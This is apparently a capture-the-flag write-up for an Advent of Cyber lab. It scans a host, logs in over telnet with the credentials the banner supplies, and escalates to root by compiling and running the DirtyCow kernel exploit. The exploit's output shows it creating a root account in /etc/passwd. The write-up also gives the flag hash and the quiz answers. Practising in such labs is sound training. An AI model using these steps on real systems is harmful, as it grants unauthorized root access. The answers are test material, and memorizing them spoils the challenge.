# Day 13 Challenge
## Coal for Christmas

Now lets run nmap on the target. See what we can get.

Simple host discovery scan  

`nmap -Pn <IP>`

Gives us

`Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 13:54 EST
Nmap scan report for 10.10.9.124
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
23/tcp  open  telnet
111/tcp open  rpcbind
Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds`


We can see it has telnet activ. Lets try to connect to it.

using cmd `telent <IP> <Port telnet is running on>`
`
Trying 10.10.9.124...
Connected to 10.10.9.124.
Escape character is '^]'.
HI SANTA!!! 
`
`We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.
`
`Username: santa
Password: clauschristmas
`
`We left you cookies and milk!
`
`christmas login:
`

And when we Login with the credentials we will be given a shell. 

Lets make the shell more interesting by spawing python ptty shell using 

`python -c 'import pty; pty.spawn("/bin/bash")'`

Gave me `santa@christmas:~$`  shell

Now lets have a look the version of linux and distro running using commands like 
`cat /etc/*release`
`uname -a`

Now open the cookies_and_milk.txt file. 

`cat cookies_and_milk.txt`

We can see that The Grinch has already ate the cookies and drank milk xD

But most of we can see somecode running... What is that C- code? It is dirtyCow which was an privilege escalation exploit which utilized race condtion that was found in kernel. 

Now lets get the exploit code on github.

lets make a file on the Hack machine nad paste the code in there.

`touch exploit.c`
`nano exploit.c`

Now paste the exploit we found.

It is time to compile the program.

using the command

`gcc -pthread exploit.c -o dirty -lcrypt`

Run the binary we just compiled 

`./dirty`

It will take sometime to complete....

After completion it makes a user with name firefart

And password that we gave


`santa@christmas:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fioTf6LnjUz7A:0:0:pwned:/root:/bin/bash
mmap: 7fa5d03ba000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'Ezpassword'.
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'Ezpassword'.
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd`

Now simply switch Users using command.

`su firefart`

Now lets navigate to root and have a look at the message_from_grinch.txt

Nice work, Santa!

Wow, this house sure was DIRTY!
I think they deserve coal for Christmas, don't you?
So let's leave some coal under the Christmas `tree`!

Let's work together on this. Leave this text file here,
and leave the christmas.sh script here too...
but, create a file named `coal` in this directory!
Then, inside this directory, pipe the output
of the `tree` command into the `md5sum` command.

The output of that command (the hash itself) is
the flag you can submit to complete this task
for the Advent of Cyber!

        - Yours,
                John Hammond
                er, sorry, I mean, the Grinch

          - THE GRINCH, SERIOUSLY

#### Final step
make a file name coal and pipe the text from tree command to md5sum.

`touch coal` > to make a file named coal

`tree | md5sum`

Gives the hash value of
 8b16f00dd3b51efadb02c1df7f8427cc

## Questions

1. What distribution of Linux and version number is this server running?
	- Ans: Ubuntu 12.04

2. Who got here first?
	- Ans: grinch

3. This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!
	- Ans: No answer needed.

4. What is the verbatim syntax you can use to compile, taken from the real C source code comments?
	- Ans: gcc  -pthread dirty.c -o dirty -lcrypt

5. What "new" username was created, with the default operations of the real C source code?
	- Ans: firefart

6. su `<user_to_change_to>`
	- Ans: No answer needed.

7. What is the MD5 hash output?
	- Ans: 8b16f00dd3b51efadb02c1df7f8427cc


Thank You! This was nice one tho compared to the rest of the challenges

